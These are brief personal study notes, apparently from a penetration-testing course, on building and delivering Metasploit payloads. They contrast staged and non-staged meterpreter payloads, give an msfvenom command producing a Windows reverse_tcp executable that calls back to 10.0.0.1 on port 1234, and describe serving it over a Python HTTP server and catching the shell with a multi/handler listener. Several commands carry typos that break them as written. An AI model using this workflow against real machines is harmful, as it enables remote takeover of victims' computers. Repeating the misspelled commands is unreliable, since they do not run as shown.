- msfvenom --list payload
- staged vs non staged payload
- windows/x64/meterpter/reverse_http
- this is staged payload because you specify meterpter and then the protcol you want to use 
- windows/x64/meterpter_reverse_http
- this is non-staged payload because you specify meterpter as one payload
- msfcenom -a x86 -p windows/meterpreter/reverse_tcp LHOST=10.0.0.1 LPORT= 1234 -f exe > /home/kali/Desktop/Windowws_payloads/payloadx86.exe
- then we can trasnfer this to target system 
- msfvenom --list formats (get type extiontions ) 
- sudo python -m SimpleHTTPServer 80 (so we can send our file to target system )
- we need to open handler listner from our kali system 
- msfconsole
- use /multi/handler
- set payload same payload as the same one to make our shell by msfvenom which is /windows/meterpter/reverse_tcp
- set LHOST and LPORT | run
- now the listener is ON!
- we got to our target we fire up that payload
